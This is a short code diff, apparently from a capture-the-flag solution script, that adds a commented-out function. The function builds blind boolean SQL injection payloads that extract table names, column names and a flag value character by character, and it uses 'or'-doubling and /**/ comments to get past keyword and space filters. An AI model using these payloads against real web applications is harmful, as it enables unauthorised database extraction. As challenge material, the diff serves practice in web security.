@@ -40,6 +40,22 @@ def challenge(offset, guess):
         return True
     else:
         return False
+    
+"""
+def challenge(offset, guess):
+    req = requests.Request(
+        'GET',
+        URL,
+        params={
+            #"q" : "'&&(select ASCII(SUBSTRING(GROUP_CONCAT(table_name) from {} for {})) from information_schema.tables where table_schema=database() limit 1)<'{}'#"
+            #"q" : "'&&(select ASCII(SUBSTRING(GROUP_CONCAT(column_name) from {} for {})) from information_schema.columns where table_name='flag' limit 1)<'{}'#"
+            "q" : "'&&(select ASCII(SUBSTRING(GROUP_CONCAT(piece) from {} for {})) from flag limit 1)<'{}'#"
+            .replace("or","oorr")
+            .replace(" ","/**/")
+            .format(offset+1, offset + 2, guess)
+        }
+    )
+"""
 def binarySearch(offset):
     low = 0
     high = 256
